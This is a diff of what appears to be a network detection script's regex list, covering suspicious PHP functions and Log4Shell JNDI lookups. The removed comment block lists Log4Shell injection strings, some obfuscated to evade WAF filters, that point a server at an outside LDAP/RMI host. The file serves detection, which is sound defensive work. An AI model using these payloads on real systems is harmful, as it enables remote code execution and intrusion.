@@ -57,18 +57,7 @@ export {
     /(str_replace[[:space:]]*?\+*?\()/i |
     /(file_get_contents[[:space:]]*?\+*?\()/i | #Example: $code = file_get_contents('https://pastebin[.]com/raw/63LjCNAs');
     /(PHP Obfuscator)/ |
-    /\$\{.*j.*?n.*?d.*?i.*?\:.*\/\/.*\}/i | # Based on https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/ and Tweets about WAF bypasses.
-    #   Examples:
-    #   ua_list=[
-    #   "${jndi:ldap://192.168.2.210/a}",
-    #   "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//192.168.2.210/a}",
-    #   "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://192.168.2.210/poc}",
-    #   "${${::-j}ndi:rmi://192.168.2.210/abs}",
-    #   "${${lower:jndi}:${lower:rmi}://192.168.2.210/poc}",
-    #   "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://192.168.2.210:1389/a}",
-    #   "${${::-j}ndi:rmi://192.168.2.210:1389/a}",
-    #   "${${lower:${lower:jndi}}:${lower:rmi}://192.168.2.210/poc}"]
-
+    /jndi\:/i | # Based on https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/
     # /(\?\>)/ | Too many false positives. Legitimate XML Ending
     # /(\%\>)/ | Too many false positives.
 
